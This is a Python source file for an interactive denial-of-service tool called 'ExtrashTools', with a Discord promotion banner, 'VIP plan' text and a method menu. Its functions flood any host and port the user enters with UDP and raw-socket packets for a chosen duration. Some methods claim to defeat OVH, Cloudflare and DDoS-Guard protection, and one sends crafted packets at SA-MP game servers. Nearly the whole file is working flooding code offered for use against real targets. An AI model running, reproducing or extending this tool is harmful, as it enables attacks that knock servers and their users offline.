import socket, struct, codecs, sys, threading, random, time, os ,getpass

cookie = open(".sinfull_cookie","w+")
fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0
 
banner = """
 _._     _,-'""`-._       Join us \u001b[31mExtrash Comunity\033[0m
(,-.`._,'(       |\`-/|       discord.gg/\u001b[31mdFCVD2aU2E\033[0m
    `-.-' \ )-`( , o o)
          `-    \`_`"'- Type \u001b[31mhelp\033[0m to see all command


"""

method = """

_._     _,-'""`-._ 
(,-.`._,'(       |\`-/| 
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

           \u001b[31mMETHODE LIST\033[0m

════════════════════════════════════
║ LAYER 4     ║  LAYER 7           ║
════════════════════════════════════
║  UDP        ║  CF                ║
║  TCP        ║  DDOS-GUARD        ║
║  OVH        ║  HTTP-CLD          ║
║  UDPV2      ║  HTTP-STM          ║
║  SAMPDOS    ║                    ║
════════════════════════════════════

"""

plan = """

_._     _,-'""`-._ 
(,-.`._,'(       |\`-/| 
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

           \u001b[31mPLAN\033[0m

"You are already a VIP / subscription LOL"

"""

help = """

_._     _,-'""`-._ 
(,-.`._,'(       |\`-/| 
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

           \u001b[31mHELP\033[0m

- Type \u001b[31mplans\033[0m to become a VIP member
- Type \u001b[31mmethod\033[0m to see all method
- Type \u001b[31mhelp\033[0m to see all command
- Type \u001b[31mrules\033[0m to see rules

"""

rules = """

_._     _,-'""`-._ 
(,-.`._,'(       |\`-/| 
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

           \u001b[31mRULES\033[0m

- Don't attack government sites.
- It is forbidden to exceed the attack limit.
- Do not abuse tools

"""

def randsender(host, port, timer, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def sampdos(host, port, timer):
	global atks
	global running
	
	Attack = [
	codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
	codecs.decode('081e62da', 'hex_codec'),
	codecs.decode('081e77da', 'hex_codec'),
	codecs.decode('081e4dda', 'hex_codec'),
	codecs.decode('021efd40', 'hex_codec'),
	codecs.decode('081e7eda', 'hex_codec')]
	
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		data = os.urandom(min(577, 1000, 1204, 1024, 999, 666, 1460, 818, 1080, 1800))
		packets = random._urandom(1021)
		packet = random._urandom(1490)
		pack = random._urandom(666)
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packet, (host, int(port)))
		sock.sendto(packets, (host, int(port)))
		if int(port) == 7777:
			sock.sendto(Attack[5], (host, int(port)))
		elif int(port) == 7796:
			sock.sendto(Attack[4], (host, int(port)))
		elif int(port) == 7771:
			sock.sendto(Attack[6], (host, int(port)))
		elif int(port) == 7784:
			sock.sendto(Attack[7], (host, int(port)))
	atks -= 1
	running -= 1
	

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	
	while True:
		x = (random.randint(1, 100))
		sys.stdout.write("\x1b]2;[@] ExtrashTools. | User & Password: [root@admin] | Power [{} %]\x07".format(x))
		sin = input("root@admin: ~$ ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system('cls' if os.name == 'nt' else 'clear')
			print(banner)
			main()
		elif sinput == "help":
			print(help)
			main()
		elif sinput == "rules":
			print(rules)
			main()
		elif sinput == "plans":
			print(plan)
			main()
		elif sinput == "method":
			print(method)
			main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpv2":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					payload = random._urandom(int(pack))
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "sampdos":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
						sinput, host, port, timer = sin.split(" ")
						socket.gethostbyname(host)
						threading.Thread(target=sampdos, args=(host, port, timer)).start()
						print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cf":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		else:
			main()

try:
	os.system('cls' if os.name == 'nt' else 'clear')
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
